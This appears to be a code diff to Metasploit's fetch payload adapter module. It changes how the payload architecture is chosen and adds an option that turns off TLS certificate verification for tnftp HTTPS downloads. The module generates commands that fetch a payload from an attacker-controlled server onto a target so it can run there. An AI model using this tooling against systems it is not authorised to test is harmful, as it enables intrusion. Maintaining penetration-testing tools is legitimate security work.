@@ -28,7 +28,6 @@ module Msf::Payload::Adapter::Fetch
     )
     deregister_options('REQUESTED_ARCH', 'FETCH_FILENAME')
     @fetch_service = nil
-    @multi_arch = nil
     @myresources = []
     @srv_resources = []
     @remote_destination_win = nil
@@ -165,7 +164,7 @@ module Msf::Payload::Adapter::Fetch
   # @return [String] The generated stage contents.
   def generate_stage(opts = {})
     opts[:arch] ||= module_info['AdaptedArch']
-    opts[:arch] = @multi_arch unless @multi_arch.nil?
+    opts[:arch] = opts[:uuid].arch if opts[:uuid]&.arch
     super
   end
 
@@ -176,7 +175,6 @@ module Msf::Payload::Adapter::Fetch
   # @return [PayloadUUID] The generated payload UUID.
   def generate_payload_uuid(conf = {})
     conf[:arch] ||= module_info['AdaptedArch']
-    conf[:arch] = @multi_arch unless @multi_arch.nil?
     conf[:platform] ||= module_info['AdaptedPlatform']
     super
   end
@@ -465,7 +463,8 @@ module Msf::Payload::Adapter::Fetch
     when 'HTTP'
       get_file_cmd = "tnftp -Vo #{_remote_destination_nix} http://#{download_uri(uri)}"
     when 'HTTPS'
-      get_file_cmd = "tnftp -Vo #{_remote_destination_nix} https://#{download_uri(uri)}"
+      get_file_cmd = datastore['FETCH_CHECK_CERT'] ? '' : 'FTPSSLNOVERIFY=1 '
+      get_file_cmd << "tnftp -Vo #{_remote_destination_nix} https://#{download_uri(uri)}"
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
